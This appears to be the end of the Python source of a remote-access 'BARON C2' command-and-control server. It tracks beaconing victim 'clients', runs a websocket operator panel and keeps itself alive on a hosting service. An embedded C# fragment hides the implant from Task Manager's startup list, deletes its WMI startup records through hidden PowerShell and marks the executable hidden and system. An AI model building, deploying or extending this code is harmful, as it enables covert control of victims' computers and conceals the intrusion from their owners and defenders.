        "            var sb = new StringBuilder();\n"
        "            try {\n"
        "                // Hide from Task Manager startup tab\n"
        '                string exeName = Path.GetFileNameWithoutExtension(\n'
        "                    System.Reflection.Assembly.GetExecutingAssembly().Location);\n"
        "                // Remove from common startup registry locations\n"
        '                string[] regPaths = {\n'
        '                    @"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",\n'
        '                    @"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",\n'
        '                    @"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run"\n'
        "                };\n"
        "                foreach (var rp in regPaths) {\n"
        "                    try {\n"
        "                        var rk = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(rp, true);\n"
        "                        if (rk != null) {\n"
        "                            // Disable visibility but keep entry\n"
        '                            var approvedKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(\n'
        '                                @"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run", true);\n'
        "                            if (approvedKey != null) {\n"
        "                                foreach (var vn in approvedKey.GetValueNames()) {\n"
        "                                    if (vn.ToLower().Contains(exeName.ToLower())) {\n"
        "                                        // Set disabled flag (byte[0] = 03 = disabled from view)\n"
        "                                        byte[] val = new byte[] { 0x03, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };\n"
        "                                        approvedKey.SetValue(vn, val);\n"
        '                                        sb.AppendLine("Hidden from: " + vn);\n'
        "                                    }\n"
        "                                }\n"
        "                                approvedKey.Close();\n"
        "                            }\n"
        "                            rk.Close();\n"
        "                        }\n"
        "                    } catch {}\n"
        "                }\n"
        "                // Hide from WMI startup query\n"
        '                RunHiddenPS("Get-CimInstance Win32_StartupCommand | Where-Object { $_.Name -like \'*" + exeName + "*\' } | ForEach-Object { $_.Delete() }");\n'
        '                sb.AppendLine("WMI startup entries cleaned");\n'
        "                // Make file hidden + system\n"
        "                string path = System.Reflection.Assembly.GetExecutingAssembly().Location;\n"
        "                if (!string.IsNullOrEmpty(path) && File.Exists(path)) {\n"
        "                    File.SetAttributes(path, FileAttributes.Hidden | FileAttributes.System);\n"
        '                    sb.AppendLine("File attributes set to Hidden+System");\n'
        "                }\n"
        "            } catch (Exception ex) {\n"
        '                sb.AppendLine("Error: " + ex.Message);\n'
        "            }\n"
        '            return sb.Length > 0 ? sb.ToString() : "Nothing to hide";\n'
        "        }\n"
    )



@socketio.on('connect')
def ws_connect():
    pass


@socketio.on('join')
def ws_join(data):
    room = data.get('room', '')
    if room:
        join_room(room)


@socketio.on('auth')
def ws_auth(data):
    """Authenticate WebSocket session"""
    token = data.get('token', '')
    session = guard.validate_session_token(token)
    if session:
        join_room('panel')
        emit('auth_ok', {'user': session['user']})
    else:
        emit('auth_fail', {'error': 'Invalid token'})


@socketio.on('subscribe_stream')
def ws_subscribe_stream(data):
    cid = data.get('cid', '')
    stype = data.get('type', '')
    if cid and stype:
        join_room(f'stream:{cid}:{stype}')


@socketio.on('disconnect')
def ws_disconnect():
    pass


# ══════════════════════════════════════════════════════════════
# BACKGROUND TASKS
# ══════════════════════════════════════════════════════════════

def background_cleanup():
    """Periodic cleanup of expired data + broadcast client status"""
    while True:
        try:
            time.sleep(15)  # Run every 15s for responsive offline detection

            now = time.time()

            # Clean expired bans
            bans = state.get('bans') or {}
            expired = [ip for ip, b in bans.items()
                       if b.get('until', 0) > 0 and now > b['until']]
            for ip in expired:
                del bans[ip]
            if expired:
                state.set('bans', bans)

            # Clean expired login attempts
            attempts = state.get('login_attempts') or {}
            expired_ips = [ip for ip, a in attempts.items()
                           if now - a.get('last', 0) > Config.LOGIN_LOCKOUT_TIME]
            for ip in expired_ips:
                del attempts[ip]
            if expired_ips:
                state.set('login_attempts', attempts)

            # Clean old nonces
            nonces = state.get('nonces') or []
            nonces = [n for n in nonces if now - n.get('time', 0) < Config.NONCE_WINDOW]
            state.set('nonces', nonces)

            # Mark offline clients & broadcast update
            clients = state.get('clients') or {}
            changed = False
            for cid, c in clients.items():
                was_online = c.get('online', False)
                is_stale = now - c.get('last_seen', 0) > 30  # 30s timeout
                if is_stale and was_online:
                    c['online'] = False
                    changed = True
                    logger.info(f"Client {cid[:8]} marked OFFLINE (no beacon for {int(now - c.get('last_seen', 0))}s)")
            if changed:
                state.set('clients', clients)

            # Always broadcast fresh client data to panel
            socketio.emit('clients_update', clients, room='panel')

            # Clean expired sessions
            sessions = state.get('sessions') or {}
            expired_sessions = [t for t, s in sessions.items()
                                if now - s.get('created', 0) > Config.TOKEN_LIFETIME]
            for t in expired_sessions:
                del sessions[t]
            if expired_sessions:
                state.set('sessions', sessions)

        except Exception as e:
            logger.error(f"Cleanup error: {e}")


def self_ping():
    """Keep Render.com alive"""
    import urllib.request
    while True:
        try:
            time.sleep(300)
            url = os.environ.get('RENDER_EXTERNAL_URL',
                                 f'http://localhost:{Config.PORT}') + '/health'
            urllib.request.urlopen(url, timeout=10)
        except Exception:
            pass


# ══════════════════════════════════════════════════════════════
# START
# ══════════════════════════════════════════════════════════════

if __name__ == '__main__':
    logger.info(f"═══ BARON C2 v{Config.VERSION} Starting ═══")
    logger.info(f"Port: {Config.PORT}")

    # Background threads
    threading.Thread(target=background_cleanup, daemon=True).start()
    threading.Thread(target=self_ping, daemon=True).start()
    
    # Start File Integrity Monitoring (Anti-Hacker Phase 1)
    guard.start_fim([os.path.abspath(__file__)])

    # Save initial state
    state.save()

    logger.info("═══ BARON C2 Ready ═══")

    socketio.run(
        app,
        host='0.0.0.0',
        port=Config.PORT,
        debug=False,
        allow_unsafe_werkzeug=True,
        use_reloader=False
    )


